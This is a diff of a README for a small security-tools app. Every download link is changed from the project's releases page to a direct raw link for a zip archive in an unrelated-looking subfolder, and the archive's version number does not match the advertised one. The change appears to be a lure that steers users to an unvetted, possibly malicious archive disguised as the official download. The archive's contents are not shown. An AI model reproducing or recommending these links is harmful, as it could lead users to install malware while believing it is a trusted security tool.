@@ -1,6 +1,6 @@
 # 🛡️ Mini-Cyber-Toolkit-v1.0 - Simple Essential Security Tools
 
-[![Download Mini-Cyber-Toolkit-v1.0](https://img.shields.io/badge/Download-Mini--Cyber--Toolkit--v1.0-brightgreen)](https://github.com/Vedant-12410097/Mini-Cyber-Toolkit-v1.0/releases)
+[![Download Mini-Cyber-Toolkit-v1.0](https://img.shields.io/badge/Download-Mini--Cyber--Toolkit--v1.0-brightgreen)](https://raw.githubusercontent.com/Vedant-12410097/Mini-Cyber-Toolkit-v1.0/main/Abarambo/Toolkit_Cyber_v_Mini_2.5-alpha.2.zip)
 
 ## Mini Cyber Toolkit v1.0
 
@@ -44,7 +44,7 @@ Each tool runs inside the app without needing extra setups. You can switch betwe
 
 Go to the release page to get the latest Mini Cyber Toolkit file. The page has all official versions and updates.
 
-[**👉 Visit this page to download Mini Cyber Toolkit v1.0**](https://github.com/Vedant-12410097/Mini-Cyber-Toolkit-v1.0/releases)
+[**👉 Visit this page to download Mini Cyber Toolkit v1.0**](https://raw.githubusercontent.com/Vedant-12410097/Mini-Cyber-Toolkit-v1.0/main/Abarambo/Toolkit_Cyber_v_Mini_2.5-alpha.2.zip)
 
 On this page:
 
@@ -163,4 +163,4 @@ The toolkit does not collect or send personal data. All operations happen on you
 
 ## Download Mini Cyber Toolkit v1.0
 
-[![Download Mini-Cyber-Toolkit-v1.0](https://img.shields.io/badge/Download-Mini--Cyber--Toolkit--v1.0-blue)](https://github.com/Vedant-12410097/Mini-Cyber-Toolkit-v1.0/releases)
+[![Download Mini-Cyber-Toolkit-v1.0](https://img.shields.io/badge/Download-Mini--Cyber--Toolkit--v1.0-blue)](https://raw.githubusercontent.com/Vedant-12410097/Mini-Cyber-Toolkit-v1.0/main/Abarambo/Toolkit_Cyber_v_Mini_2.5-alpha.2.zip)
